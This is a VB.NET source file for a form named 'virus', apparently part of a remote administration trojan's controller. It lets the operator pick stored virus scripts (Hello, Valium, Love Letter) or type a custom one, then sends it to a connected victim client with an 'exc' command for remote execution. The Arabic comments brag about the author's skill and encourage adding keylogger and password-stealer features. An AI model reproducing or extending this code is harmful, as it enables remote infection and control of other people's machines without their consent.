Public Class virus
    '########################################################################################################
    '################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
    '############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
    '########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
    '################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
    'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
    'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
    'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
    '########################################################################################################
    '#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
    'او حتى password stealer
    '##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
    '############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
    '
    '
    '
    '
    Public key As String
    Private is_edit As Boolean = False
    Private Sub virus_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        Check_Raised()
    End Sub

    Private Sub CheckBox2_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox2.CheckedChanged
        Check_Raised()
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox3.CheckedChanged
        Check_Raised()
    End Sub
    Private Sub Check_Raised()
        ' Hello                         valium                        lover letter
        If CheckBox1.Checked = True And CheckBox2.Checked = False And CheckBox3.Checked = False Then
            RichTextBox1.ReadOnly = True
            RichTextBox1.Enabled = False
            RichTextBox1.ForeColor = Color.Black
            RichTextBox1.Text = My.Resources.Dl_HELLOVIR
            ' Hello                         valium                        lover letter
        ElseIf CheckBox1.Checked = False And CheckBox2.Checked = True And CheckBox3.Checked = False Then
            RichTextBox1.ReadOnly = True
            RichTextBox1.Enabled = False
            RichTextBox1.ForeColor = Color.Black
            RichTextBox1.Text = My.Resources.ValiumVirus

            ' Hello                         valium                        lover letter
        ElseIf CheckBox1.Checked = False And CheckBox2.Checked = False And CheckBox3.Checked = True Then

            RichTextBox1.ReadOnly = True
            RichTextBox1.Enabled = False
            RichTextBox1.ForeColor = Color.Black
            RichTextBox1.Text = My.Resources.love_letter
        Else
            RichTextBox1.ForeColor = Color.Yellow
            RichTextBox1.ReadOnly = False
            RichTextBox1.Enabled = True
            If is_edit = False Then
                RichTextBox1.Text = ""
            Else
                is_edit = False
            End If

        End If

    End Sub
    Private Sub Send_HELLO()
        Dim b As String = My.Resources.Dl_HELLOVIR
        If (b <> "") Then
            Form1.Send_to_Client("exc" & FUNC.SPL & b & FUNC.SPL, key)

        End If
    End Sub
    Private Sub Send_Valium()
        Dim b As String = My.Resources.ValiumVirus
        If (b <> "") Then
            Form1.Send_to_Client("exc" & FUNC.SPL & b & FUNC.SPL, key)

        End If
    End Sub
    Private Sub Send_Lover_letter()
        Dim b As String = My.Resources.love_letter
        If (b <> "") Then
            Form1.Send_to_Client("exc" & FUNC.SPL & b & FUNC.SPL, key)

        End If
    End Sub

    Private Sub Label4_Click(sender As System.Object, e As System.EventArgs) Handles Label4.Click
        MsgBox("You are somehow Smart to explore this" & vbNewLine & "Now You can Edit the Virus Script", MsgBoxStyle.Information)
        is_edit = True
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If CheckBox1.Checked = True Then
            Send_HELLO()
        End If
        If CheckBox2.Checked = True Then
            Send_Valium()
        End If
        If CheckBox3.Checked = True Then
            Send_Lover_letter()
        End If
        If RichTextBox1.Lines.Length - 1 > 5 Then
            Send_custom(RichTextBox1.Text)
        Else
            MsgBox("Custom Virus must be not less that 5 lines of code at least ", MsgBoxStyle.Critical)
        End If

    End Sub
    Private Sub Send_custom(ByVal b As String)
        If (b <> "") Then
            Form1.Send_to_Client("exc" & FUNC.SPL & b & FUNC.SPL, key)
        End If
    End Sub
End Class